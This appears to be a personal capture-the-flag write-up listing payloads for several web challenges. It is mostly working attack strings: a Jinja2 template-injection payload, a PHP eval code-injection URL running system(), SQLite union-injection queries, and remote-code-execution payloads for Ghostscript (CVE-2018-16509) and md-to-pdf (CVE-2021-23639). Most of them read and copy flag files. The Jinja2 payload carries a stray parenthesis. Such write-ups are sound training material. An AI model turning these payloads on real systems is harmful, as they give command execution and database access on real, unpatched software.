# WEB

## Templeted `Flask/Jinja2 Template Injection`
Flask/Jinja2 Template Injection
Payload:
```
http://<ip_address>/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
```


## LoveTok `Code Injection [PHP eval()]`
```
# Get flag file name
http://<ip_address>/?format=${system($_GET[1])}&1=ls

# Get flag
http://<ip_address>/?format=${system($_GET[1])}&1=cat+flageXXXX
```


## Toxic `Insecure Deserialization` & `Log Poisoning Attack`
### `TODO`



## petpetrcb `CVE-2018-16509`
Ghostscript === 9.23 RCE
Payload:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```


Payload for this challenge:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

## Under Construction `JWT Algorithm Confusion` & `SQL Injection`
JWT Algorithm Confusion -> https://portswigger.net/web-security/jwt/algorithm-confusion

Next SQL Injection (SQLite3)
```
# Get Tables
user_in_database' union select name,NULL from sqlite_master where type='table' and name not like 'sqlite_%';-- 

# Get Columns
user_in_database' union select sql,NULL from sqlite_master where tbl_name = 'users' and type = 'table';--

# Get Flag
user_in_database' and 1=2 UNION SELECT *,NULL from flag_storage;--
```


## Blinker Fluids `CVE-2021-23639`
md-to-pdf < 5.0.0 RCE
Payload:
```
const { mdToPdf } = require('md-to-pdf'); var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';
```
Payload for this challenge:
```
# In request:
"---js\n((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))\n---RCE;"

# In PDF editor on site:
---js
  ((require(\"child_process\")).execSync(\"cd .. && cat flag.txt > /app/static/instances/RCE.txt\"))
---RCE;

```
